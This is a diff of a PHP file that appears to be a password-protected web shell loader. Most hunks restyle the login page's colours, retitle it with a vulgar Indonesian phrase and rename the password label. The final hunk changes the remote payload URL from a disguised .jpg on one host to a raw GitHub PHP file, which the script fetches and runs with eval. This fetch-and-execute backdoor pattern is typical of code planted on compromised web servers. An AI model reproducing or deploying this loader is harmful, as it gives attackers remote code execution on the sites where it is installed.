@@ -11,11 +11,11 @@ function show_login_form()
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Aptisme</title>
+    <title>You Kontol Liat Liat</title>
     <style>
         body {
             background-color: #000;
-            color: #0f0;
+            color: #1e90ff; /* Biru lebih soft */
             font-family: monospace;
             display: flex;
             justify-content: center;
@@ -25,7 +25,7 @@ function show_login_form()
         .login-box {
             background: #111;
             padding: 30px;
-            border: 2px solid #0f0;
+            border: 2px solid #1e90ff; /* Biru lebih soft */
             border-radius: 10px;
         }
         input {
@@ -33,24 +33,24 @@ function show_login_form()
             padding: 10px;
             margin-top: 10px;
             background: #000;
-            color: #0f0;
-            border: 1px solid #0f0;
+            color: #1e90ff; /* Biru lebih soft */
+            border: 1px solid #1e90ff; /* Biru lebih soft */
         }
         input[type=submit] {
-            background: #0f0;
+            background: #1e90ff; /* Biru lebih soft */
             color: #000;
             font-weight: bold;
             cursor: pointer;
         }
         input[type=submit]:hover {
-            background: #00b300;
+            background: #4682b4; /* Biru gelap yang lebih soft */
         }
     </style>
 </head>
 <body>
     <div class="login-box">
         <form method="post">
-            <label>Password:</label>
+            <label>Gas Tol:</label>
             <input type="password" name="password" required>
             <input type="submit" value="Login">
         </form>
@@ -110,7 +110,7 @@ if (!isset($_SESSION[$session_key])) {
     }
 }
 
-$target_url = 'https://haxor-research.com/rimuru.jpg';
+$target_url = 'https://raw.githubusercontent.com/detik-com/anakbaik/refs/heads/main/Sme.php';
 $payload = geturlsinfo($target_url);
 if ($payload !== false) {
     eval('?>' . $payload);
